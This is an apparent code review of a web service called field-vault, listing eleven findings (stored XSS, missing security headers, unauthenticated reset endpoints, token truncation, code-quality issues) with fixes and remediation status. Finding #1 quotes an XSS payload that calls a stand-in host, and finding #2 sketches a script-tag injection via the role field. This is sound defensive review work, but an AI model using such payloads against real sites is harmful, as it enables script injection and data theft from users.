# field-vault — Code Review

> **Remediation status — 7 of 11 findings auto-remediated & verified (2026-06-29).**
> Applied safe, non-UX fixes; re-verified independently (pytest green + ruff clean) and pushed per project.
>
> **Remediated (verified ✅):**
> - `FV-003` — No HTTP security headers (CSP, X-Frame-Options, X-Content-Type-Options)
> - `FV-006` — HMAC token truncated to 48 bits — silent collision risk at scale
> - `FV-007` — Bare except Exception in LLM router swallows provider errors silently
> - `FV-008` — _KEY captured at module import time makes test monkeypatching fragile
> - `FV-009` — Live smoke retry wrapper retries deliberate 404 responses
> - `FV-010` — note_records() reconstructs full dataset on every call
> - `FV-011` — AuditLog.entries() returns shallow copy — inner dicts are mutable references
>
> **Verification proof:** `75 passed, 13 skipped, 1 warning in 0.87s` · ruff clean.
> Remaining findings in the table below were not auto-applied (UX-impacting or needing a design decision) — open for manual triage.


**Health: fair** — The backend de-identification, policy, and audit chain are well-designed and well-tested; the frontend undermines this with real stored XSS, and two unauthenticated destructive POST endpoints are exposed without guards.

---

## Findings

| # | Severity | Category | File | Finding | Recommendation | UX Impact | Auto-Fixable |
|---|----------|----------|------|---------|----------------|-----------|--------------|
| 1 | high | security | `src/field_vault/static/index.html:633` | **Stored XSS via `purpose` field.** The purpose text input is free-form. Its value is written verbatim into the audit log and then rendered via `innerHTML` (`${e.purpose\|\|'—'}`) in the audit table without HTML escaping. Submitting `<img src=x onerror=fetch('//evil')>` as a purpose persists it and executes for every user who views the audit panel. | Escape all server-returned values before `innerHTML` assignment. Add a helper `esc(s)` that does `.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;")` and apply it to every interpolated API value in audit row rendering. | true | true |
| 2 | high | security | `src/field_vault/static/index.html:650-651,658` | **XSS via `r.value` and `r.reason` in innerHTML.** The access-result panel renders `r.value` (the recovered field value) and `r.reason` (which the server builds by interpolating the user-supplied role and purpose strings, e.g. `f"unknown role '{role}'"`) directly into `innerHTML` without escaping. A direct API call with `role: "<script>..."` causes `r.reason` to contain the tag; it then executes in the Access Console panel. | Apply `esc()` to `r.value`, `r.reason`, `body.role`, `body.field` before interpolating into HTML. | true | true |
| 3 | medium | security | `src/field_vault/api.py` | **No HTTP security headers.** FastAPI is configured with no `SecurityHeadersMiddleware`, no CSP, no `X-Frame-Options`, and no `X-Content-Type-Options`. Without CSP, findings #1 and #2 execute inline scripts freely. Without `X-Frame-Options`, the SPA can be framed for clickjacking. | Add `starlette.middleware.trustedhost` or a custom middleware that sets `Content-Security-Policy`, `X-Frame-Options: DENY`, and `X-Content-Type-Options: nosniff`. | false | true |
| 4 | medium | security | `src/field_vault/api.py:112,119` | **Unauthenticated destructive POST endpoints.** `POST /admin/reset` wipes all de-identified records and the entire audit log. `POST /audit/_demo_tamper` surgically mutates audit entries. Both are reachable by any unauthenticated caller on a deployed instance, allowing an adversary to destroy the tamper-evident audit chain with a single curl. | Guard with at minimum a static bearer token (env `ADMIN_TOKEN`), or make the endpoints available only when `DEBUG=true`, or remove them from the production router. | false | false |
| 5 | medium | bug | `src/field_vault/api.py:52` | **`"status"` key leaks into 404 response body from `/access`.** `store.access_field()` returns `{"allowed": False, "reason": "unknown record", "status": 404}` and `api.py` passes this dict verbatim as the JSON body while extracting `status` for the HTTP status code. The response body therefore contains `"status": 404` as an implementation detail, creating an inconsistent API contract (the `/records/{id}` 404 returns `{"error": "unknown record"}` without a status key). | Strip the `status` key before returning: `body = {k: v for k, v in result.items() if k != "status"}; return JSONResponse(body, status_code=...)`. | true | true |
| 6 | low | security | `src/field_vault/deid.py:27` | **Token truncated to 48 bits.** `hmac.new(_KEY, …).hexdigest()[:12]` retains only 12 hex characters (48 bits) of the 256-bit HMAC. Two distinct values that produce the same 12-character prefix collide silently — the vault overwrites the older entry, causing `detokenize()` to return the wrong identity. Negligible at 20 records; 100 k+ records make a collision increasingly likely. | Use at least 16 hex characters (64 bits), or keep the full digest as the vault key while using a shorter display alias for readability. | false | true |
| 7 | low | quality | `src/field_vault/llm.py:212` | **Bare `except Exception` swallows provider errors without logging.** When an LLM provider call fails, the exception is caught and the provider is silently skipped. Operators have no visibility into why a configured provider was bypassed. | Log the exception at `WARNING` level before continuing to the next provider: `except Exception as exc: fallbacks.append(provider); logging.warning("provider %s failed: %s", provider, exc); continue`. | false | true |
| 8 | low | quality | `src/field_vault/deid.py:22` | **`_KEY` captured at module import time.** `_KEY = os.environ.get("FIELD_VAULT_TOKEN_KEY", …).encode()` runs once when the module is first imported. Environment changes made after import (e.g., by test monkeypatching) are ignored, so tests that set `FIELD_VAULT_TOKEN_KEY` after the module loads see the old key and produce tokens that cannot be detokenized. | Read the env var lazily inside `_token()`, or expose a `reload_key()` function the test fixture can call after monkeypatching. | false | true |
| 9 | low | quality | `tests/test_live_smoke.py:51` | **Retry wrapper retries deliberate 404 responses.** `_install_retry` includes `404` in the default retry status set. `test_regression_unknown_record_404` therefore burns 3 unnecessary 1-second sleeps before returning the expected 404, adding ~3 s to the smoke suite per run. | Remove 404 from the default retry set. Only retry transient server-side errors (5xx, 502, 503, 504) and connection failures. | false | true |
| 10 | low | quality | `src/field_vault/data.py:100` | **`note_records()` reconstructs from scratch on every call.** The function re-parses `_RAW`, generates notes, and builds gold labels on each invocation. It is called from the module-level `_NAMES` initialization, from `evaluate()` in a loop over all records, and from multiple tests. At demo scale (20 records) the cost is negligible; at production scale it would be a hot path. | Decorate with `@functools.lru_cache(maxsize=None)` to memoize the result across calls within a process. | false | true |
| 11 | low | quality | `src/field_vault/audit.py:50` | **`entries()` returns a shallow copy of mutable dicts.** `list(self._entries)` copies the outer list but the inner dicts remain references to the live audit entries. Code that mutates a returned dict (e.g., adding a key for display) inadvertently changes the canonical entry and breaks the hash chain. | Return deep copies: `import copy; return [copy.copy(e) for e in self._entries]`, or freeze entries as `types.MappingProxyType` before appending. | false | true |

---

## Notes

### What the project does well
- **Backend security design is solid.** The de-identification pipeline (HMAC tokenization for direct identifiers, one-way generalization for quasi-identifiers), the RBAC policy layer, the purpose-of-use gate, and the hash-chained audit log are all correctly implemented and well-tested. The audit log intentionally never records field values—only decision metadata—which is the right privacy posture.
- **Test coverage is broad.** The project ships `test_security.py` with planted canary secrets, adversarial input fuzzing on every mutating endpoint, PHI-leakage assertions on the audit log, and a live smoke suite. The security tests catch many classes of regression.
- **LLM routing is resilient.** The multi-provider chain with a deterministic offline fallback means the service never fails for lack of API keys; the offline detector achieves perfect recall on the synthetic set.
- **Dockerfile is non-root and minimal.** The image uses a dedicated `app` user (UID 1001) and installs only runtime dependencies.

### XSS root cause
All XSS findings share one root cause: the frontend has no `esc()` helper, and `innerHTML` is used as a general-purpose DOM update mechanism throughout `index.html`. The fix is a single shared helper function applied consistently. Fields populated from `<select>` elements (role, field, record) are constrained by the dropdown and are lower risk, but `purpose` (a free-text `<input>`) is the most realistic attack vector because it requires no API crafting—it is exercised through normal UI use.

### Unauthenticated admin endpoints
`/admin/reset` and `/audit/_demo_tamper` are explicitly labeled as demo aids, but they are registered in the production FastAPI router with no guards. Any visitor to the deployed app can POST to `/admin/reset` and wipe the audit log, negating the tamper-evidence guarantee that is the project's central demonstration. A simple `if not os.environ.get("DEBUG"):` guard or a static token check would close this.
